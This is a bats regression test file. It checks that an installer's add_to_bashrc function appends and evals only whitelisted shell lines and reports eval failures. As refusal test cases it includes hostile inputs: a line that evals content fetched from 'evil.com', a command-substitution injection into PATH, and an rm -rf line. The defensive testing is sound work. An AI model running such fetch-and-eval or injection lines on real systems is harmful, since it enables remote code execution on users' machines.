#!/usr/bin/env bats
# Regression guard for #743: add_to_bashrc must refuse to eval anything
# outside the documented whitelist and must surface eval failures.

setup() {
    REPO_ROOT="$(git -C "$(dirname "$BATS_TEST_FILENAME")" rev-parse --show-toplevel)"
    SRC_SCRIPT="${REPO_ROOT}/scripts/shell/install.sh"
    [ -f "$SRC_SCRIPT" ]
    TEST_TMPDIR="$(mktemp -d)"
    export HOME="$TEST_TMPDIR"
    touch "$HOME/.bashrc"
    export BLUE="" NC=""
    # source install.sh; the existing `BASH_SOURCE[0] != $0` guard in
    # install.sh stops the installer body from running, leaving the helper
    # functions defined.
    # shellcheck source=/dev/null
    source "$SRC_SCRIPT"
}

teardown() { rm -rf "$TEST_TMPDIR"; }

@test "whitelist constant is defined after sourcing" {
    [ -n "${ADD_TO_BASHRC_ALLOWED_RE:-}" ]
    declare -F add_to_bashrc
}

@test "whitelisted brew shellenv line is appended" {
    # eval may fail (no brew installed) — that returns non-zero, but the
    # line MUST still be appended to ~/.bashrc.
    run add_to_bashrc 'eval "$(/home/linuxbrew/.linuxbrew/bin/brew shellenv)"'
    grep -qF 'brew shellenv' "$HOME/.bashrc"
}

@test "whitelisted export PATH absolute-literal line is appended and applied" {
    run add_to_bashrc 'export PATH=$PATH:/usr/local/go/bin'
    [ "$status" -eq 0 ]
    grep -qF '/usr/local/go/bin' "$HOME/.bashrc"
}

@test "export-PATH caller shape (post-\$dir expansion) is accepted" {
    # install.sh has a caller `add_to_bashrc "export PATH=\$PATH:$dir"`; after
    # the caller's shell expands $dir, the function receives this literal:
    local expanded="export PATH=\$PATH:$HOME/.local/bin"
    run add_to_bashrc "$expanded"
    [ "$status" -eq 0 ]
    grep -qF "$HOME/.local/bin" "$HOME/.bashrc"
}

@test "non-whitelisted line is refused, not appended, returns non-zero" {
    run add_to_bashrc 'rm -rf /tmp/attacker'
    [ "$status" -ne 0 ]
    ! grep -qF 'attacker' "$HOME/.bashrc"
    [[ "$output" == *"refusing to eval non-whitelisted line"* ]]
}

@test "command-substitution attempt in PATH is refused" {
    run add_to_bashrc 'export PATH=$PATH:$(whoami)'
    [ "$status" -ne 0 ]
    ! grep -qF 'whoami' "$HOME/.bashrc"
}

@test "non-shellenv eval form is refused" {
    run add_to_bashrc 'eval "$(/usr/bin/curl evil.com)"'
    [ "$status" -ne 0 ]
    ! grep -qF 'curl' "$HOME/.bashrc"
}

@test "duplicate line is not re-appended" {
    echo 'export PATH=$PATH:/usr/local/go/bin' >> "$HOME/.bashrc"
    run add_to_bashrc 'export PATH=$PATH:/usr/local/go/bin'
    [ "$status" -eq 0 ]
    [ "$(grep -cF '/usr/local/go/bin' "$HOME/.bashrc")" -eq 1 ]
}

@test "whitelisted eval form is accepted even when the command is absent" {
    # Documents the bash subshell semantics that make a *whitelisted* eval line
    # return 0 even when its inner command is missing:
    #   - `$(/nonexistent/bin/brew shellenv)` FAILS IN A SUBSHELL (exit 127)
    #   - that failure does NOT propagate; it yields empty output instead
    #   - so the outer eval runs `eval ""`, which always returns 0
    # Hence, for the only whitelisted eval shape in use, the rc-capture branch
    # is unreachable — matching the function-header note in install.sh.
    #
    # Direct runtime coverage of the rc-capture branch itself (for any future
    # whitelisted shape whose eval CAN fail) lives in the
    # "AC2: eval failure surfaces non-zero return code and warning" test below.
    run add_to_bashrc 'eval "$(/nonexistent/bin/brew shellenv)"'
    [ "$status" -eq 0 ]
    grep -qF '/nonexistent/bin/brew' "$HOME/.bashrc"
}

@test "AC2: eval failure surfaces non-zero return code and warning" {
    # Direct runtime coverage of AC2 (the P7/POLA fix): when eval itself
    # fails, add_to_bashrc must capture eval's rc, emit a 'failed to apply'
    # warning, and return that non-zero rc.
    #
    # The whitelist regex normally blocks any line whose eval can fail, so to
    # exercise the rc-capture branch we source a copy of install.sh with the
    # `readonly` qualifier on the whitelist constant stripped, then widen the
    # constant to a permissive pattern. This lets a line containing valid
    # shell syntax that exits non-zero (`false`) reach eval, exercising the
    # `eval "$line" || _rc=$?` capture, the warning, and the non-zero return.
    # Build the stub in the test tmpdir (auto-cleaned by teardown). Symlink
    # the real lib/ next to it so the stub's relative
    # `source .../lib/install_helpers.sh` still resolves.
    local stub="${TEST_TMPDIR}/install_eval_failure.sh"
    ln -sfn "$(dirname "$SRC_SCRIPT")/lib" "${TEST_TMPDIR}/lib"
    sed 's/^readonly ADD_TO_BASHRC_ALLOWED_RE=/ADD_TO_BASHRC_ALLOWED_RE=/' \
        "$SRC_SCRIPT" > "$stub"
    run bash -c '
        export HOME="'"$HOME"'" BLUE="" NC=""
        source "'"$stub"'"
        ADD_TO_BASHRC_ALLOWED_RE=".*"
        add_to_bashrc "false"
    '
    [ "$status" -ne 0 ]
    [[ "$output" == *"failed to apply"* ]]
}
